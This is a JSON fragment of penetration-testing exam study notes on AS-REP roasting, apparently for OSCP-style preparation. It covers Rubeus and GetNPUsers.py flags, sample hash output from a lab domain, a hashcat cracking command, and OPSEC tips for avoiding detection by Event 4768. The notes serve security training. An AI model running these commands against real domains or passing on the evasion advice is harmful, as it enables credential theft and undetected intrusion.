      "exam": "exam-ok",
      "notes": "=== RUBEUS vs GETNPUSERS.PY ===\nBoth attack the same vulnerability — accounts with pre-auth disabled.\n  Rubeus (Windows)     → runs on the target Windows host, native Kerberos stack\n  GetNPUsers.py (Linux)→ remote attack from attacker machine, no foothold needed\nUse Rubeus when you're already on a Windows host and want to stay in-memory.\nUse GetNPUsers.py for initial access (no domain credentials possible).\n\n=== FLAGS EXPLAINED ===\n  /user:mmorgan   → target specific user (omit for all vulnerable accounts)\n  /nowrap         → hash on single line (essential for Hashcat — hash must be one line)\n  /format:hashcat → outputs $krb5asrep$23$... format instead of default JtR format\n  /domain:        → specify domain if not domain-joined or wrong domain\n  /dc:            → target DC IP\n  /outfile:       → save hashes to file directly\n\n=== OUTPUT TO LOOK FOR ===\n  [*] AS-REP roast hash for user: mmorgan\n  $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:A2B1C3...\n\nPrefix $23$ = RC4 (etype 23) → Hashcat mode 18200\nPrefix $18$ = AES256 (etype 18) → also mode 18200 but significantly harder to crack\n\n=== CRACK THESE HASHES ===\nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt\n\n=== OPSEC ===\nKerberos AS-REQ without pre-auth sent to DC generates Event 4768 (Kerberos TGT request).\nRequesting for many accounts in rapid succession looks like a scan. Use /user to\ntarget specific accounts from your PowerView enumeration rather than bulk roasting.\n\n=== NO CREDENTIALS REQUIRED ===\nIf you just need the hash with zero creds:\n  .\\Rubeus.exe asreproast /format:hashcat /nowrap\nThis works from any domain-joined machine, even with a low-privilege account.\nAnonymous requests may also work from non-joined machines depending on DC config. Also covered in: OSCP PEN-200 Chapter 22 (Attacking Active Directory Authentication).",
